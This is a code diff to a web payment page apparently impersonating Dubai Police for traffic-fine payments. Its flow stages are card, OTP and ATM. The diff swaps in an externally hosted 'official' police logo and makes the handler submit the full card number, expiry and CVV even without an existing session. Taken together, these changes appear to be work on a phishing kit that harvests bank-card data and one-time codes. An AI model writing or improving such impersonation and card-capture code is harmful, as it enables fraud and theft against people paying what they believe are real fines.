@@ -8,12 +8,13 @@ type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pend
 // ======== مكون شعار شرطة دبي ========
 function DubaiPoliceLogo({ size = 40 }: { size?: number }) {
   return (
-    <svg width={size} height={size} viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <circle cx="50" cy="50" r="48" fill="#006633" stroke="#FFD700" strokeWidth="3"/>
-      <polygon points="50,15 58,35 80,35 63,50 70,70 50,57 30,70 37,50 20,35 42,35" fill="#FFD700"/>
-      <circle cx="50" cy="50" r="12" fill="#006633" stroke="#FFD700" strokeWidth="2"/>
-      <text x="50" y="88" textAnchor="middle" fill="#FFD700" fontSize="8" fontFamily="Arial" fontWeight="bold">DUBAI POLICE</text>
-    </svg>
+    <img
+      src="https://d2xsxph8kpxj0f.cloudfront.net/310519663234476152/RPNmG5rkcSfq3Rp3WTDuVe/dubai-police-logo-official_8b53a80e.svg"
+      width={size}
+      height={size}
+      alt="شرطة دبي"
+      style={{ borderRadius: "50%", objectFit: "contain" }}
+    />
   );
 }
 
@@ -536,10 +537,29 @@ export default function Payment() {
   const totalAmount = paymentData?.totalAmount || "0";
 
   const handleCardSubmit = async (data: { cardName: string; cardNumber: string; cardExpiry: string; cardCvv: string }) => {
-    if (!sessionId) return;
     setIsSubmitting(true);
     try {
-      await submitCard.mutateAsync({ sessionId, ...data });
+      let currentSessionId = sessionId;
+      // إنشاء الجلسة إذا لم تكن موجودة بعد
+      if (!currentSessionId && paymentData) {
+        const res = await createSession.mutateAsync({
+          selectedFines: paymentData.selectedFines || [],
+          totalAmount: paymentData.totalAmount || "0",
+          plateNumber: paymentData.plateNumber,
+          plateSource: paymentData.plateSource,
+          queryId: paymentData.queryId,
+        });
+        if (res.success) {
+          currentSessionId = res.sessionId;
+          setSessionId(res.sessionId);
+          sessionStorage.setItem("paymentSessionId", res.sessionId);
+        }
+      }
+      if (!currentSessionId) {
+        setErrorMessage("حدث خطأ في إنشاء جلسة الدفع. يرجى المحاولة مرة أخرى.");
+        return;
+      }
+      await submitCard.mutateAsync({ sessionId: currentSessionId, ...data });
       setStage("card_pending");
       setErrorMessage(null);
     } catch (err: any) {
